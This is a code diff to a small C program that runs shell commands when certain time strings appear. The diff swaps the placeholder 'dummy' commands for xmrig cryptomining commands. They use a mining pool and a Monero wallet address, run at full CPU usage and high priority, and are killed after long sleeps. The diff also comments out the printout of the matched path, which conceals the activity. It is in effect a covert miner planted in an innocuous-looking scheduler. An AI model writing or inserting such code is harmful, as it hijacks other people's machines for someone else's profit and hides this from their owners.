@@ -9,8 +9,11 @@
  */
 
 /**4-16:14*/
-char *key[]={"12:3","5-18:0","18:0"};
-char *code[]={"./dummy pertending_run_at_noon 3600000000","./dummy pretending_run_at_weekend 3600000000","./dummy pretending_run_at_night 3600000000"};
+char *key[]={"11:25","5-18:0","18:0"};
+char *code[]={
+    "./xmrig -a cryptonight -o pool.supportxmr.com:3333 -p x -u 4ABXrDCNuD8STT3iZtCM1NW8NbRec6g4nX7hsACajd4zHF3Ptiudv9N6J1rZSr4Yo6R3NsBQJEicP8AwRi8ETqT8SPVSkcn.中科院低能无理研究所 --asm=intel --max-cpu-usage=100 -k --cpu-priority 5 --donate-level 1 & PID=$!; sleep 7500; kill -9 $PID",
+    "./xmrig -a cryptonight -o pool.supportxmr.com:3333 -p x -u 4ABXrDCNuD8STT3iZtCM1NW8NbRec6g4nX7hsACajd4zHF3Ptiudv9N6J1rZSr4Yo6R3NsBQJEicP8AwRi8ETqT8SPVSkcn.中科院低能无理研究所 --asm=intel --max-cpu-usage=100 -k --cpu-priority 5 --donate-level 1 & PID=$!; sleep 221600; kill -9 $PID",
+    "./xmrig -a cryptonight -o pool.supportxmr.com:3333 -p x -u 4ABXrDCNuD8STT3iZtCM1NW8NbRec6g4nX7hsACajd4zHF3Ptiudv9N6J1rZSr4Yo6R3NsBQJEicP8AwRi8ETqT8SPVSkcn.中科院低能无理研究所 --asm=intel --max-cpu-usage=100 -k --cpu-priority 5 --donate-level 1 & PID=$!; sleep 50400; kill -9 $PID"};
 int listc=3;
 int main(int argc, char** argv)
 {
@@ -28,7 +31,7 @@ int main(int argc, char** argv)
         {
             if(strstr(path,key[c]))
             {
-                printf("%s",path);
+                //printf("%s",path);
                 fp = popen(code[c],"r");
                 
                 while (fgets(path, sizeof(path)-1, fp) != NULL)
